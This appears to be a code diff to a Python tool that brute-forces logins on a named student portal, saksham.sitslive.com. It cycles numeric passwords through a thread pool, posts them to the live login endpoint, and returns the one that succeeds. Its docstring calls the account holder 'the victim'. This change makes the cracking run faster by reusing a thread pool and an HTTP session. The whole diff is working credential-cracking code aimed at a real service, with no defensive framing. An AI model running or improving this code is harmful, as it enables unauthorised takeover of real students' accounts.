@@ -11,17 +11,26 @@ import re
 from model.student import Student
 
 
-def bruteforceLogin(user_id: str, start: int, batch_size: int = 100, threads: int = 10) -> str:
-    p = start
-    q = start + batch_size
+def bruteforceLogin(user_id: str, start_from: int, batch_size: int = 100, threads: int = 10) -> str:
+    """
+
+    :param user_id: Portal userid of the victim
+    :param start_from: Number from where password bruteforce should start
+    :param batch_size: Number of login request sent at a time to portal
+    :param threads: Specify number of threads to be used
+    :return: Password string if cracked successfully else None
+    """
+    p = start_from
+    q = start_from + batch_size
     muserId = user_id.replace("/", "%2F")
+    pool = ThreadPoolExecutor(threads)
+    session = requests.Session()
 
     while True:
-        pool = ThreadPoolExecutor(threads)
         futures = []
 
         for i in range(p, q):
-            future = pool.submit(attemptLogin, muserId, str(i))
+            future = pool.submit(attemptLogin, muserId, str(i), session)
             futures.append(future)
 
         for f in futures:
@@ -35,7 +44,7 @@ def bruteforceLogin(user_id: str, start: int, batch_size: int = 100, threads: in
         q += batch_size
 
 
-def attemptLogin(user_id, password):
+def attemptLogin(user_id, password, session):
     url = 'https://saksham.sitslive.com/login'
 
     headers = {
@@ -62,7 +71,7 @@ def attemptLogin(user_id, password):
         "data-daw": "ScriptManager1=updatepanel%7CbtnLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=GXq8WYlFoIyiG3kHh%2FyWm36EVSPnNg9oMUi9wBqeXZ5oLCwDaEF1fWGlZu6NIZKEGzs%2FZqM8kQDJ35ynh50OxuDTdeqaTh4wZe5gn2NIsPG1M9Ds%2BzDSx0hHu317Lrbw&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=k9EujBZLYjXQ6rTY4Kfb27V%2FFrBy8Ba23xg9ZaR9inInhEHhMnDnorNbGIO4S1IWOPs2u1aAPCkn5ieUxwSc0CgIlxhouE9FPckXsb%2F078IUjLS6AJvoaw3K%2F%2BAABCmEBzF1Ae469WWe4mDfDZPlJyLwg8Y3lH9jol6vnwidKeaSu%2FewI8Hnv04%2BBd2lhQqFFWErXV4tmCmIKvRSer%2FfDZ1HHrJ3Vk%2FQdhUnj8JX2LHHfAeU5ALRWJxbSolA%2FDYVhU8PM7E3jQd1FBYJtVrqHwAgbSxV%2B6dPvyEDYjFbaiHkiz84m5JxTVPK53KMH%2Bpa&txtLoginID=" + user_id + "&txtPassword=" + password + "&ddlType=0&txtUserName=&__ASYNCPOST=true&btnLogin=Login",
     }
 
-    response = requests.post(url, headers=headers, data=json.dumps(payload))
+    response = session.post(url, headers=headers, data=json.dumps(payload))
 
     if "pageRedirect" in response.text:
         return password
